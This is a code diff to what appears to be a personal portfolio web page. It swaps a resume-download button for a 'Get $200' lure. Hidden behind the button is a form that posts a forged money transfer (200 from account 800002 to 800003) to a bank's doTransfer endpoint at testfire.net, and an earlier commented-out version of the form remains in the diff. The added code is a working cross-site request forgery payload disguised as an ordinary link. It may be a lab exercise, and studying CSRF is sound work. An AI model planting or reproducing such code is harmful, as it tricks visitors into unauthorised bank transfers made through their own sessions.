@@ -29,7 +29,21 @@
                     <li><a href="#three">Get in touch</a></li>
                 </ul>
             </nav>
-            <li><a href="files/HetShahResume.pdf" target="_blank" rel="noreferrer noopener" class="button primary icon solid fa-download">Get $100</a></li>
+            <li>
+                <!-- <a href="files/HetShahResume.pdf" target="_blank" rel="noreferrer noopener" class="button primary icon solid fa-download">Get $100 
+                    <form id = form1 action = "http://testfire.net/bank/doTransfer" method = "post">
+
+                        <input name="submit" value="Submit" type="submit">
+                    </form>
+                </a> -->
+            
+                <form id="my_form" method="post" action="http://testfire.net/bank/doTransfer">
+                    <input type = "hidden" name= "fromAccount" value = "800002">
+                    <input type = "hidden" name= "toAccount" value = "800003">
+                    <input type = "hidden" name= "transferAmount" value = "200">
+                    <a href="javascript:{}" onclick="document.getElementById('my_form').submit();" target="_blank" rel="noreferrer noopener" class="button primary icon solid fa-download">Get $200</a>
+                </form>    
+            </li>
 
         </div>
     </section>
